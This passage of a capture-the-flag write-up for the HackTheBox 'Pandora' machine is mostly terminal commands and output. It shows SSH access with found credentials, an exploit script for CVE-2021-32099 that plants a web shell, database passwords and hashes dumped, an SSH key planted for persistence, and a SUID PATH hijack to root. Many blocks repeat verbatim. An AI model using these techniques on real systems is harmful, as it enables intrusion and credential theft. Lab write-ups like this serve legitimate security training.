As shown in the output above, the credentials are daniel:HotelBabylon23.

Use the credentials to gain access to the machine via SSH:

┌──(kali㉿kali)-[~/Desktop/Labs/Pandora]
└─$ ssh daniel@panda.htb

This key is not known by any other names.

daniel@pandora:~$

I transferred the host_check binary to my machine and ran strings on it to get useful strings. One result I notice is the /pandora_console directory:

┌──(kali㉿kali)-[~/Desktop/Labs/Pandora]
└─$ strings host_check                          
/lib64/ld-linux-x86-64.so.2
puts
printf
system
sleep
__cxa_finalize
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
PandoraFMS host check utility
Now attempting to check PandoraFMS registered hosts.
Files will be saved to ~/.host_check
/usr/bin/curl 'http://127.0.0.1/pandora_console/include/api.php?op=get&op2=all_agents&return_type=csv&other_mode=url_encode_separator_%7C&user=daniel&pass=HotelBabylon23' > ~/.host_check 2>/dev/null
Host check unsuccessful!
Please check your credentials.
Terminating program!
Host check successful!
Terminating program!
Ussage: ./host_check -u username -p password.
Two arguments expected.
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
┌──(kali㉿kali)-[~/Desktop/Labs/Pandora]
└─$ strings host_check                          
/lib64/ld-linux-x86-64.so.2
puts
printf
system
sleep

__libc_start_main
libc.so.6
GLIBC_2.2.5

[]A\A]A^A_
PandoraFMS host check utility
Now attempting to check PandoraFMS registered hosts.
Files will be saved to ~/.host_check
/usr/bin/curl 'http://127.0.0.1/pandora_console/include/api.php?op=get&op2=all_agents&return_type=csv&other_mode=url_encode_separator_%7C&user=daniel&pass=HotelBabylon23' > ~/.host_check 2>/dev/null
Host check unsuccessful!
Please check your credentials.
Terminating program!
Host check successful!
Terminating program!
Ussage: ./host_check -u username -p password.
Two arguments expected.
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones

Setup the port forwarding as the internal service is not accessible from my machine:

┌──(kali㉿kali)-[~/Desktop/Labs/Pandora]
└─$ ssh -L 80:localhost:80 daniel@pandora.htb -N
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
daniel@pandora.htb's password: 
┌──(kali㉿kali)-[~/Desktop/Labs/Pandora]
└─$ ssh -L 80:localhost:80 daniel@pandora.htb -N
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
daniel@pandora.htb's password:

And now I can access the /pandora_console application:

However, I couldn't login. I tried the default creds, but I had no luck.

Upon researching the application version further, I got a hit on multiple vulnerabilities. The one that worked for is the CVE-2021-32099 Pandora_v7.0NG.742. Using this exploit, I managed to obtain RCE as the user matt:

┌──(kali㉿kali)-[~/Desktop/Labs/Pandora/Pandora_v7.0NG.742_exploit_unauthenticated]
└─$ python3 sqlpwn.py -t localhost -f shell.php  
URL:  http://localhost/pandora_console
[+] Sending Injection Payload
[+] Requesting Session
[+] Admin Session Cookie : 77dl57h8u683r3ecdb2tbjjsju
[+] Sending Payload 
[+] Respose : 200
[+] Pwned :)
[+] If you want manual Control : http://localhost/pandora_console/images/shell.php?test=
CMD > whoami
matt

CMD > ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.3.51  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:fe94:7601  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:fe94:7601  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:76:01  txqueuelen 1000  (Ethernet)
        RX packets 705222  bytes 86762546 (86.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 820047  bytes 1024849852 (1.0 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 10660  bytes 2585449 (2.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10660  bytes 2585449 (2.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


CMD >

I started another listener on port 443 and used the exploit to obtain a reverse shell connection as matt:

I obtained the credentials of MySQL application from the config.php file:

matt@pandora:/var/www/pandora/pandora_console/include$ cat config.php
cat config.php
<?php
// File generated by centos kickstart
$config["dbtype"] = "mysql";		
$config["dbname"]="pandora";		
$config["dbuser"]="pandora";		
$config["dbpass"]="PandoraFMSSecurePass2021";
$config["dbhost"]="localhost";			
$config["homedir"]="/var/www/pandora/pandora_console";
$config["homeurl"]="/pandora_console";	
error_reporting(0); 
$ownDir = dirname(__FILE__) . '/';
include ($ownDir . "config_process.php");
?>
matt@pandora:/var/www/pandora/pandora_console/include$ 
matt@pandora:/var/www/pandora/pandora_console/include$ cat config.php
cat config.php
<?php
// File generated by centos kickstart
$config["dbtype"] = "mysql";		
$config["dbname"]="pandora";		
$config["dbuser"]="pandora";		
$config["dbpass"]="PandoraFMSSecurePass2021";
$config["dbhost"]="localhost";			
$config["homedir"]="/var/www/pandora/pandora_console";
$config["homeurl"]="/pandora_console";	
error_reporting(0); 
$ownDir = dirname(__FILE__) . '/';
include ($ownDir . "config_process.php");
?>
matt@pandora:/var/www/pandora/pandora_console/include$

Using the MySQL credentials, I gained access to the database and dumped contents from the tusuairo table to retrieve the password hashes:

MariaDB [pandora]> select id_user, password from tusuario;
+---------+----------------------------------+
| id_user | password                         |
+---------+----------------------------------+
| admin   | ad3f741b04bd5880fb32b54bc4f43d6a |
| daniel  | 76323c174bd49ffbbdedf678f6cc89a6 |
| matt    | f655f807365b6dc602b31ab3d6d43acc |
+---------+----------------------------------+
3 rows in set (0.001 sec)

MariaDB [pandora]> select id_user, password from tusuario;
+---------+----------------------------------+
| id_user | password                         |
+---------+----------------------------------+
| admin   | ad3f741b04bd5880fb32b54bc4f43d6a |
| daniel  | 76323c174bd49ffbbdedf678f6cc89a6 |
| matt    | f655f807365b6dc602b31ab3d6d43acc |
+---------+----------------------------------+
3 rows in set (0.001 sec)

However, I had no luck cracking the hash of admin and matt users.

The user.txt flag:

matt@pandora:/home$ cd matt
cd matt
matt@pandora:/home/matt$ ls -la
ls -la
total 24
drwxr-xr-x 2 matt matt 4096 Dec  7  2021 .
drwxr-xr-x 4 root root 4096 Dec  7  2021 ..
lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
-rw-r----- 1 root matt   33 Feb 22 09:26 user.txt
matt@pandora:/home/matt$ 

matt@pandora:/home/matt$ cat user.txt
cat user.txt
9e0df515de49ca6f2b31eafcb633a57d
matt@pandora:/home/matt$ 

matt@pandora:/home$ cd matt
cd matt
matt@pandora:/home/matt$ ls -la
ls -la
total 24
drwxr-xr-x 2 matt matt 4096 Dec  7  2021 .
drwxr-xr-x 4 root root 4096 Dec  7  2021 ..
lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
-rw-r----- 1 root matt   33 Feb 22 09:26 user.txt
matt@pandora:/home/matt$ 

matt@pandora:/home/matt$ cat user.txt
cat user.txt
9e0df515de49ca6f2b31eafcb633a57d
matt@pandora:/home/matt$

Obtain a stable SSH access by planting an SSH key inside the home directory of user matt:

matt@pandora:/home/matt/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN3ewq2+ascLLoI8Ohn1IaBzagKVLOG4ZCULoj42Y+9s kali@kali' > authorized_keys
<BzagKVLOG4ZCULoj42Y+9s kali@kali' > authorized_keys
matt@pandora:/home/matt/.ssh$ 


.....SNIP....

┌──(kali㉿kali)-[~/Desktop/Labs/Pandora/SSH]
└─$ chmod 600 matt    
                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/Pandora/SSH]
└─$ ssh matt@pandora.htb -i matt

** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html

matt@pandora:~$

There is an interesting binary by the name of pandora_backup that has SUID bit set:

matt@pandora:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
matt@pandora:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1

I transferred pandora_backup to my machine and ran strings on it to get what it does:

┌──(kali㉿kali)-[~/Desktop/Labs/Pandora]
└─$ strings pandora_backup 
/lib64/ld-linux-x86-64.so.2
puts
setreuid
system
getuid
geteuid
__cxa_finalize
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
Backup failed!
Check your permissions!
Backup successful!
Terminating program!
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
....SNIP....
┌──(kali㉿kali)-[~/Desktop/Labs/Pandora]
└─$ strings pandora_backup 
/lib64/ld-linux-x86-64.so.2
puts
setreuid
system
getuid
geteuid
__cxa_finalize
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
Backup failed!
Check your permissions!
Backup successful!
Terminating program!
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
....SNIP....

From the output above, the following line is the most interesting as the backup is performed:

tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*

One thing that stands out is the tar is not using absolute path. That means I could possibly hijack it.

And bingo. Perform path abuse to obtain root:

matt@pandora:/tmp/Test$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup successful!
Terminating program!
matt@pandora:/tmp/Test$ sudo bash
root@pandora:/tmp/Test# 

matt@pandora:/tmp/Test$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup successful!
Terminating program!
matt@pandora:/tmp/Test$ sudo bash
root@pandora:/tmp/Test#

The root.txt flag:

matt@pandora:/tmp/Test$ sudo bash
root@pandora:/tmp/Test# cat /root/root.txt
67d1bee842e81ac970aadf569ef63bdb
root@pandora:/tmp/Test# 

matt@pandora:/tmp/Test$ sudo bash
root@pandora:/tmp/Test# cat /root/root.txt
67d1bee842e81ac970aadf569ef63bdb
root@pandora:/tmp/Test#
